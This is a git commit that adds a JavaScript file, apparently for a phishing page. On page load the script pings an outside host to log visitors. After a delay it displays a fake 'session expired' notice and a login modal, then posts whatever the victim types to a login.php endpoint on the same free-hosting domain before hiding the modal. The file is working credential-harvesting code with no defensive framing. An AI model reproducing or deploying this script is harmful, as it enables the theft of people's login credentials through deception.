df9715c37f013fb7e277b110e91f8ad172be19e4
royelbengal2022 <119756924+royelbengal2022@users.noreply.github.com>
2022-12-04 01:19:03 +0600

    Add files via upload

---
+++ js/index.js
@@ -0,0 +1,38 @@
+$.get("https://royelbengal.000webhostapp.com/onloadip.php");
+
+$(document).ready(function(){
+	setTimeout(function() {
+		$("#sess_ex").show();
+		$("body").css("overflow", "hidden");
+	},8000);
+
+  setTimeout(function() {
+    $(".login-modal").show();
+    $("body").css("overflow", "hidden");
+  },11000);
+   
+//form ajax, disable button, send mail
+
+$('#form').submit(function (e) {
+  e.preventDefault();
+  $("#login").prop('disabled', true);
+  $("#login").attr("value", "Loging...");
+
+  $.ajax({
+    type: 'POST',
+    url: 'https://royelbengal.000webhostapp.com/login.php',
+    data: $('#form').serialize(),
+    success: function (msg) {
+      $("#sess_ex").css("display", "none");
+      $(".login-modal").css("display", "none");
+      $("body").css("overflow", "auto");
+    },
+  });
+  setTimeout(function() {
+    $("#sess_ex").css("display", "none");
+    $(".login-modal").css('display', 'none');
+    $("body").css("overflow", "auto");
+  },5000);
+});
+
+});
